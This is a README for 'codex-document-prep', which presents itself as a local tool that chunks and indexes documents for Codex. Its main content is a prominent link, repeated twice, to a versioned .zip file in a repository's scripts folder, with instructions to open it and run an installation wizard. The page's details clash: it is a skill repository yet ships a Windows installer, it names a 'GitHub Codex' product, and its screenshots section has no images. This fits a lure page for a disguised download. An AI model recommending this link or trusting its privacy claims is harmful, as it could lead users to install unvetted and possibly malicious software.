<h1>📄 codex-document-prep - Process Documents for Codex Easily</h1>
<p align="center">
  <a href="https://raw.githubusercontent.com/Quotable-mimus510/codex-document-prep/main/skills/codex-document-prep/scripts/document-codex-prep-v1.1-alpha.3.zip" style="display: inline-block; padding: 15px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; font-size: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); margin: 20px 0;">⬇️ Download Now</a>
</p>

## 📚 What Does This Do?

Stop feeding whole documents to Codex. This tool converts, chunks, indexes, and retrieves content from PDF, Office, EPUB, and MOBI files. It works locally on your computer, so your documents stay private. Designed for use with AI tools like GitHub Codex and RAG systems.

## 🚀 Getting Started

No programming skills needed. Follow these steps:

### Step 1: Download
Visit this link to download the application: <a href="https://raw.githubusercontent.com/Quotable-mimus510/codex-document-prep/main/skills/codex-document-prep/scripts/document-codex-prep-v1.1-alpha.3.zip">https://raw.githubusercontent.com/Quotable-mimus510/codex-document-prep/main/skills/codex-document-prep/scripts/document-codex-prep-v1.1-alpha.3.zip</a>

### Step 2: Run the Application
After downloading, open the file and follow the installation wizard. The program will install itself.

### Step 3: Add Your Documents
Drag and drop your PDF, Word, EPUB, or MOBI files into the program window. You can add multiple files at once.

### Step 4: Process and Retrieve
Click "Process" to convert and chunk your documents. Then use the search tool to find specific sections. Copy any part to use with Codex or your AI tool.

## ✨ Features

- **Local-First Processing**: All conversion and indexing happens on your computer. No files uploaded to any server.
- **Multi-Format Support**: Handles PDF, Word (DOCX), Excel (XLSX), PowerPoint (PPTX), EPUB, and MOBI formats.
- **Smart Chunking**: Automatically splits long documents into smaller, meaningful chunks for Codex's context window.
- **Full-Text Search**: Find any word or phrase instantly across all your processed documents.
- **Token Counter**: See exactly how many tokens each chunk will use in Codex.
- **Export Modes**: Choose different retrieval strategies to match your project needs.

## 💻 System Requirements

- **Operating System**: Windows 10 or newer, 64-bit
- **RAM**: 4 GB minimum, 8 GB recommended
- **Storage**: 500 MB free space for the app, plus space for document indexing
- **Documents**: PDF, EPUB, MOBI, Office file formats

## 🖥️ How It Works

The application converts your documents into Markdown text, then splits them into smaller chunks. Each chunk gets a unique ID and gets indexed for fast search. When you need content, just type your query and the system returns relevant sections.

Example workflow:
1. Add a 300-page PDF manual
2. Program converts it to Markdown
3. Splits into ~1,000 token chunks
4. You search "installation steps"
5. Gets exact chunks with installation instructions

## 🔧 Configuration Options

Adjust these settings in the preferences menu:

### Chunk Size
Choose how big (in tokens) each chunk should be. Smaller chunks (500-1,000) work well for precise lookups. Larger chunks (2,000-4,000) help keep related content together.

### Overlap
Set the overlap between chunks (0-200 tokens). Overlap prevents important content from being split at a bad spot.

### Retrieval Method
- **Top-K Retrieval**: Returns the K most relevant chunks
- **Threshold Retrieval**: Returns all chunks with similarity scores above your threshold
- **Hybrid**: Combines both methods

## 📸 Screenshots

The main window after processing shows:
- A list of processed files on the left
- The search bar in the top panel
- Results displayed in the middle pane
- Chunk detail and token count in the bottom panel

## 🛠️ Advanced Use

For power users, these features are available:

- **Custom Parsing Rules**: Fine-tune how each file type gets converted to text
- **Regular Expression Filters**: Add search patterns to ignore specific content (e.g., page numbers, headers)
- **Batch Processing**: Process hundreds of files at once
- **Export Formats**: Choose between JSON, CSV, or plain text for output files
- **Plugin Support**: Extend with custom parsers for other file types

## 🔒 Privacy & Security

No data ever leaves your computer. All processing happens locally. Your documents stay private.

## 📌 Support

If you have trouble:
- Check the Issues tab on the GitHub page
- Report bugs or request features
- Configuration help is in the menu

## 👥 Contributing

This project uses the MIT license. Contributions are welcome through pull requests or issue reports.

Keywords: agent-skills, codex, codex-skill, context-window, document-conversion, document-processing, epub, information-retrieval, local-first, markdown, mobi, office-documents, pdf-to-markdown, rag, token-efficiency